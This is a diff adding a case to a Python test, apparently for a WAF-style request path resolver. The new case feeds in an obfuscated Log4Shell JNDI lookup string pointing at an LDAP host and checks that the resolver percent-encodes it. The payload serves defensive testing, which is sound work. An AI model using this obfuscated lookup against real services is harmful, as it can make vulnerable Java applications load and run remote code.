@@ -1269,6 +1269,23 @@ def test_mc_path_template_resolution_appends_the_encoded_semantic_payload() -> N
     )
     assert "path_payload" not in resolution["rendered_request"]
 
+    item["input"]["path_payload"] = "${${::-j}${::-n}${::-d}${::-i}:ldap://foo/bar}"
+    resolution = _expected_template_resolution(
+        item,
+        resolver_id="mc-approved-route-adapter",
+        profile_id="waf-standard@2",
+        profile_digest="sha256:" + "a" * 64,
+        route={
+            "scheme": "https",
+            "authority": "approved-mc-target.internal",
+            "path": "/inventory/items/42",
+        },
+    )
+    assert resolution["rendered_request"]["path"] == (
+        "/inventory/items/42/$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D"
+        "$%7B::-i%7D:ldap:%2F%2Ffoo%2Fbar%7D"
+    )
+
 
 def test_bv_ddb49be_root_dimensions_match_cg_semantics_and_profile() -> None:
     request, records = _chain()
